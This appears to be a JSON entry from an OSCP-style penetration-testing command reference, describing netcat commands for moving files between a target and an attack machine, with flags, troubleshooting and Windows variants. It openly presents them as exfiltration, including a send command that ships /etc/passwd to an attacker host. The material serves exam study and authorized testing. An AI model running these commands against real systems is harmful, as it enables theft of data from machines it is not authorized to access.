{
  "category": "file-transfer",
  "subcategory": "netcat",
  "description": "Netcat-based file transfer methods",
  "commands": [
    {
      "id": "ft-nc-receive",
      "name": "Netcat: Receive File",
      "category": "file-transfer",
      "subcategory": "netcat",
      "command": "nc -lvnp <LPORT> > <OUTPUT>",
      "description": "Receive file using netcat listener (attacker receives from target)",
      "tags": [
        "FILE_TRANSFER",
        "NETCAT",
        "UPLOAD",
        "OSCP:HIGH"
      ],
      "variables": [
        {
          "name": "<LPORT>",
          "description": "Port to listen on",
          "example": "4444",
          "required": true
        },
        {
          "name": "<OUTPUT>",
          "description": "File to save received data",
          "example": "received_file.txt",
          "required": true
        }
      ],
      "flag_explanations": {
        "-l": "Listen mode - nc becomes server waiting for incoming connection",
        "-v": "Verbose - show connection details and progress",
        "-n": "No DNS resolution - use IP addresses only, faster connection",
        "-p": "Port - specify listening port (some nc versions don't require -p, just nc -lv <PORT>)",
        ">": "Redirect stdout to file - saves all received data to specified file"
      },
      "success_indicators": [
        "Listening on 0.0.0.0 <PORT>",
        "Connection received from <IP>:<PORT>",
        "File size increases: watch -n1 ls -lh <OUTPUT>",
        "Connection closed - transfer complete"
      ],
      "failure_indicators": [
        "Address already in use - port taken by another service",
        "nc: command not found - use alternative like /dev/tcp",
        "No connection - firewall blocking or target cannot reach port"
      ],
      "troubleshooting": {
        "Port already in use": "Choose different port or find process: sudo lsof -i :<PORT>",
        "No connection from target": "Check firewall allows inbound on port, verify target can reach: nc -zv <LHOST> <PORT> from target",
        "Transfer incomplete": "File cut off early. Ensure target sends EOF or closes connection: nc <IP> <PORT> < file on target side",
        "Binary file corrupted": "Check file hash matches: md5sum <OUTPUT>. Netcat is transparent for binary",
        "Connection hangs": "Target still sending or connection not closed. Kill with Ctrl+C, file likely complete"
      },
      "prerequisites": [],
      "alternatives": [
        "ft-uploadserver",
        "ft-smb-server"
      ],
      "next_steps": [
        "ft-nc-send",
        "ft-file-verify-md5"
      ],
      "notes": "OSCP METHODOLOGY: Simple, universal file exfiltration. Works when HTTP/SMB are blocked. No server setup required beyond nc. Useful for quick one-off transfers.\n\nMANUAL ALTERNATIVE: Python socket server, but nc is simpler and almost always available.\n\nTARGET COMMAND: From target to send file: nc <LHOST> <LPORT> < file_to_exfil.txt (Linux) or type file.txt | nc <LHOST> <LPORT> (Windows)\n\nEXAM TIP: Start listener BEFORE sending command to target. Connection is one-shot - closes after transfer. For multiple files, restart listener each time. Monitor file size in real-time: watch -n1 ls -lh <OUTPUT>\n\nBINARY FILES: Works perfectly for binary files (executables, images, archives) - netcat is protocol-agnostic.\n\nNO PROGRESS: No transfer progress - you won't know when complete until connection closes. For large files, check output size periodically.\n\nTIME ESTIMATE: Limited by network bandwidth, typically 1-10MB/sec on local network.",
      "oscp_relevance": "high"
    },
    {
      "id": "ft-nc-send",
      "name": "Netcat: Send File",
      "category": "file-transfer",
      "subcategory": "netcat",
      "command": "nc <LHOST> <LPORT> < <FILE>",
      "description": "Send file from target to netcat listener on attack machine",
      "tags": [
        "FILE_TRANSFER",
        "NETCAT",
        "UPLOAD",
        "OSCP:HIGH"
      ],
      "variables": [
        {
          "name": "<LHOST>",
          "description": "Attack machine IP with netcat listener",
          "example": "10.10.14.5",
          "required": true
        },
        {
          "name": "<LPORT>",
          "description": "Port with netcat listener",
          "example": "4444",
          "required": true
        },
        {
          "name": "<FILE>",
          "description": "File to send from target",
          "example": "/etc/passwd",
          "required": true
        }
      ],
      "flag_explanations": {
        "<": "Input redirection - reads file content and sends through netcat connection",
        "-w 1": "Optional timeout - close connection 1 second after EOF (ensures clean disconnect): nc -w 1 <IP> <PORT> < file",
        "-v": "Verbose - show connection status (optional): nc -v <IP> <PORT> < file",
        "-n": "No DNS - use IP only, faster: nc -n <IP> <PORT> < file"
      },
      "success_indicators": [
        "Connection established (no error)",
        "Command completes and returns to prompt",
        "File appears on Kali listener side"
      ],
      "failure_indicators": [
        "Connection refused - no listener on target IP:port",
        "No route to host - firewall or network issue",
        "nc: command not found - use alternative method",
        "Permission denied - cannot read source file",
        "The '<' operator is reserved for future use - PowerShell doesn't support input redirection"
      ],
      "troubleshooting": {
        "Connection refused": "Ensure listener running on Kali: nc -lvnp <PORT> > output_file",
        "nc not found": "Use alternative: ft-bash-dev-tcp or ft-curl-upload",
        "File incomplete on receiver": "Use -w timeout: nc -w 3 <IP> <PORT> < file to ensure clean close",
        "Permission denied reading file": "Check file permissions: ls -la <FILE>. If root-owned, use sudo: sudo nc...",
        "Listener not receiving data": "Check firewall allows inbound on Kali, verify port: sudo netstat -antp | grep <PORT>",
        "PowerShell < operator error": "PowerShell doesn't support < redirection. Use: Get-Content file | nc <IP> <PORT> OR type file | nc <IP> <PORT> OR cmd /c \"nc <IP> <PORT> < file\""
      },
      "prerequisites": [
        "ft-nc-receive"
      ],
      "alternatives": [
        "ft-curl-upload",
        "ft-bash-dev-tcp"
      ],
      "next_steps": [
        "ft-file-verify-md5"
      ],
      "notes": "OSCP METHODOLOGY: Simple, universal file exfiltration when HTTP/SMB unavailable. Works with just netcat - no web server required. Perfect for quick one-off transfers or restricted environments.\n\nMANUAL ALTERNATIVE: Could use telnet or /dev/tcp, but nc is most common.\n\nLISTENER COMMAND: On Kali, start receiver FIRST: nc -lvnp <PORT> > received_file.txt\n\nEXAM TIP: Ensure listener running before sending file. Connection is one-shot - closes after transfer. For multiple files, restart listener each time. Verify integrity with md5sum on both sides.\n\nWINDOWS POWERSHELL: PowerShell does NOT support < redirection. Use piping instead:\n- Get-Content file.txt | nc.exe <IP> <PORT>\n- type file.txt | nc.exe <IP> <PORT> (shorter)\n- cmd /c \"nc.exe <IP> <PORT> < file.txt\" (runs in cmd.exe)\n\nWINDOWS CMD.EXE: Supports < redirection directly: nc.exe <IP> <PORT> < file.txt\n\nBINARY FILES: Works perfectly for binary files - netcat is protocol-agnostic. Use same command for executables, images, archives.\n\nNO PROGRESS: No transfer progress indicator - you won't know when complete. Check listener output for file growth.\n\nTIME ESTIMATE: Limited by network bandwidth, typically 1-10MB/sec on local network. Near-instant for small text files.",
      "oscp_relevance": "high"
    }
  ]
}
